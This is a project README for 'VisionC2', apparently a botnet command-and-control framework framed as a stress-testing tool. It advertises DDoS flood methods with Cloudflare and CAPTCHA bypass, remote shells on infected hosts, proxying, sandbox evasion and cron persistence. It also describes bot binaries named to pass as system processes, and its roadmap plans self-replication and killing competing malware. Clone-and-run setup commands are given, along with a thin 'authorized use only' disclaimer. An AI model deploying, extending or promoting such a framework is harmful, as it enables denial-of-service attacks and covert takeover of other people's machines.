# VisionC2 – Advanced Botnet Command & Control Framework

![VisionC2](https://img.shields.io/badge/VisionC2-V1.7-red)
![Go](https://img.shields.io/badge/Go-1.23.0+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
![License](https://img.shields.io/badge/License-GNU-yellow)


**VisionC2** is a Go-based C2 framework for **network stress testing**. Features a full-screen TUI, TLS 1.3 + HMAC auth + sandbox evasion, remote shell, SOCKS5 proxy, and advanced Layer 4/7 attack methods.

---

## ✨ Features

### Bot Capabilities
* **Layer 4 Attacks** – UDP, TCP, SYN, ACK, GRE, DNS flood methods
* **Layer 7 Attacks** – HTTP/HTTPS/TLS with HTTP/2 fingerprinting and Cloudflare UAM bypass (including CAPTCHA solving)
* **Remote Execution** – Interactive and fire-and-forget shell commands
* **SOCKS5 Proxy** – Convert any agent into a SOCKS5 proxy server

###  CNC & TUI Interface
* Full-screen **TUI Command & Control**
* Real-time bot management & attack builder
* **Single-Agent Control** – Interactive per-bot shell
* **Broadcast Shell Execution** – Filter by architecture, RAM, and bot count
* **Built-in SOCKS5 Proxy Manager** – One-click setup per bot

###  Security & Stealth
* TLS 1.3 with Perfect Forward Secrecy
* HMAC challenge-response authentication
* Multi-layer obfuscation (RC4, XOR, byte substitution, MD5)
* Anti-analysis & sandbox detection

###  Performance & Scalability
* **2 Servers** → **30k–40k RPS**
* **Layer 4 Throughput (2 servers)** → **2–6 Gbps**
* 14+ architectures with automated cross-compilation
* Fully automated ~5-minute setup

> *Performance depends on agent hardware and network conditions.*

---
## 🧠 Architecture Overview

```
[ Admin ] → [ C2 Server/TUI ] ↔ [ Bot Agents ]
                    │              │
            TLS 1.3 │              ├─ Persistence (cron/rc.local)
            HMAC Auth │            ├─ Multi-layer C2 Resolution
                    │              ├─ Sandbox Detection
                    │              └─ Encrypted Command Loop
                    │
                    └─ Issues HMAC challenge
                       Verifies response
                       Queues commands
```

**Bot Authentication Flow:**
1. **C2 Decryption + C2 Resolution** – Base64 → XOR → RC4 → Byte Sub → MD5 → DoH TXT/DNS A
2. **HMAC Auth** – TLS handshake → Challenge → Response (MD5(ch+MAGIC+ch)) → AUTH_SUCCESS
3. **Runtime** – Encrypted command loop, attacks, shell, SOCKS5, reconnect on drop
---

## 🧪 Demo

### TLS Bypass vs High-Density DSTAT Graph (6 servers)
<p align="center">
  <img src="https://github.com/user-attachments/assets/52ffce78-eb92-4f7c-b34e-ba6ff227e416" alt="Demo Animation">
</p>

---

## 🚀 Quick Start

### Prerequisites
```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen
# Install Go 1.23+ from https://go.dev/dl/
```

### Installation
```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
```

---

## ⚙️ Configuration

After setup, review `setup_config.txt`:
* C2 address & ports
* Magic code & encryption keys
* Generated 4096-bit TLS certificates

---

## 🖥️ Running the C2

**TUI Mode (recommended)**
```bash
./server
# After running setup a server binary will be copied to the main VisionC2 directory
```

**Split / Multi-User Mode**
```bash
./server --split
# nc <server-ip> <admin-port>
```

Bot binaries are automatically built into `bot/bins/`.

---

## 🧬 Binary Layout & Architecture Support

Binaries are named to resemble system processes for operational blending:

| Binary    | Architecture | Description                |
|-----------|--------------|----------------------------|
| kworkerd0 | x86 (386)    | 32-bit Intel/AMD           |
| ethd0     | x86_64       | 64-bit Intel/AMD           |
| mdsync1   | ARMv7        | Raspberry Pi 2/3           |
| ip6addrd  | ARM64        | Raspberry Pi 4 / Android   |
| …         | +10 more     | MIPS, PPC64, RISC-V, s390x |

See `bot/build.sh` or `USAGE.md` for full mapping.

---

## 🗺️ Roadmap

### In Progress
* Improved daemonization & persistence
* Locker/killer (removal of competing agents)

### Planned
* Auto-generated DGA fallback domains
* Self-replication & spreading
* Single-instance port takeover

---

## 📚 Documentation

| File | Description |
|------|-------------|
| [USAGE.md](USAGE.md) | Setup, deployment, and TUI usage |
| [COMMANDS.md](cnc/COMMANDS.md) | Full CNC command reference |
| [CHANGELOG.md](CHANGELOG.md) | Version history |

---

## ⚠️ Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND STRESS TESTING ONLY**

The authors assume no responsibility for misuse or legal consequences.

---

## 📜 License

GNU License – see `LICENSE`

---

## 🤝 Support

* GitHub Issues for bugs & feature requests
* Documentation in `USAGE.md`
* Contact: `dev@sinners.city`

---
